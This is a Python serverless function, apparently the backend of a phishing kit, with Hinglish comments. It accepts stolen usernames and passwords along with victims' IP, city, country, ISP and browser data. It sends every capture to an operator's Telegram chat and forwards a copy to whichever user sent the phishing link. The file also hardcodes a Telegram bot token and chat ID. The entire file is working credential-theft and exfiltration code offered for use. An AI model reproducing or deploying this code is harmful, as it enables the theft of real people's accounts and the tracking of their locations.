from http.server import BaseHTTPRequestHandler
import json
import requests
from urllib.parse import urlparse, parse_qs
import os

# === CONFIG ===
# Environment variables use karo — hardcode mat karo production mein
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8970330576:AAHAdAeE0ChensA55gVAcps_tybF-cNmS_g")
MASTER_CHAT_ID = os.environ.get("MASTER_CHAT_ID", "1007541797")


class handler(BaseHTTPRequestHandler):
    """Vercel Python serverless function handler"""
    
    def _send_json(self, status_code, data):
        """Helper to send JSON response"""
        self.send_response(status_code)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode('utf-8'))
    
    def do_OPTIONS(self):
        """Handle CORS preflight"""
        self._send_json(200, {"status": "ok"})
    
    def do_GET(self):
        """Health check"""
        self._send_json(200, {"status": "ok", "message": "Capture API running"})
    
    def do_POST(self):
        try:
            # Read request body
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            
            # Parse JSON
            try:
                data = json.loads(post_data)
            except json.JSONDecodeError:
                self._send_json(400, {"error": "Invalid JSON"})
                return
            
            # Extract UID from URL query params
            parsed = urlparse(self.path)
            params = parse_qs(parsed.query)
            uid = params.get('uid', [None])[0]
            
            # Extract victim data with defaults
            victim_username = data.get('username', 'N/A')
            victim_password = data.get('password', 'N/A')
            
            # IP detection: check multiple headers
            victim_ip = (
                data.get('ip') or
                self.headers.get('X-Forwarded-For', '').split(',')[0].strip() or
                self.headers.get('X-Real-IP') or
                'N/A'
            )
            
            victim_city = data.get('city', 'N/A')
            victim_country = data.get('country', 'N/A')
            victim_isp = data.get('isp', 'N/A')
            victim_ua = data.get('user_agent', self.headers.get('User-Agent', 'N/A'))
            timestamp = data.get('timestamp', 'N/A')
            
            # ====== MASTER BOT KO MSG ======
            master_msg = (
                f"🎯 NEW CAPTURE!\n\n"
                f"👤 Username: <code>{victim_username}</code>\n"
                f"🔑 Password: <code>{victim_password}</code>\n\n"
                f"📍 IP: {victim_ip}\n"
                f"🏙️ City: {victim_city}\n"
                f"🌎 Country: {victim_country}\n"
                f"🏢 ISP: {victim_isp}\n"
                f"📱 UA: {victim_ua[:50]}\n"
                f"🆔 User ID (uid): <code>{uid or 'N/A'}</code>\n"
                f"⏰ {timestamp}"
            )
            
            api_url = f"https://api.telegram.org/bot{BOT_TOKEN}"
            
            # Send to master
            try:
                requests.post(f"{api_url}/sendMessage", json={
                    "chat_id": MASTER_CHAT_ID,
                    "text": master_msg,
                    "parse_mode": "HTML"
                }, timeout=10)
            except requests.RequestException as e:
                print(f"[!] Master send failed: {e}")
            
            # ====== USER KO FORWARD (jisne link bheja tha) ======
            if uid:
                user_msg = (
                    f"✅ <b>Capture Successful!</b>\n\n"
                    f"📧 <b>Credentials:</b>\n"
                    f"👤 Username: <code>{victim_username}</code>\n"
                    f"🔑 Password: <code>{victim_password}</code>\n\n"
                    f"🌍 <b>Victim Info:</b>\n"
                    f"📍 IP: {victim_ip}\n"
                    f"🏙️ City: {victim_city}\n"
                    f"🌎 Country: {victim_country}\n"
                    f"🏢 ISP: {victim_isp}\n\n"
                    f"⏰ {timestamp}"
                )
                
                try:
                    resp = requests.post(f"{api_url}/sendMessage", json={
                        "chat_id": int(uid),  # uid = user ka Telegram ID
                        "text": user_msg,
                        "parse_mode": "HTML",
                        "disable_web_page_preview": True
                    }, timeout=10)
                    
                    # Agar fail ho to master ko batao
                    if not resp.ok:
                        error_data = resp.json()
                        requests.post(f"{api_url}/sendMessage", json={
                            "chat_id": MASTER_CHAT_ID,
                            "text": f"⚠️ <b>Forward Failed for uid {uid}</b>\n"
                                    f"Reason: {error_data.get('description', 'Unknown')}\n\n"
                                    f"<b>Probable cause:</b> User ne bot ko /start nahi kiya.",
                            "parse_mode": "HTML"
                        }, timeout=10)
                        
                except requests.RequestException as e:
                    print(f"[!] Forward failed: {e}")
            
            # Success response
            self._send_json(200, {"status": "ok"})
            
        except Exception as e:
            print(f"[!] Error: {e}")
            self._send_json(500, {"error": str(e)})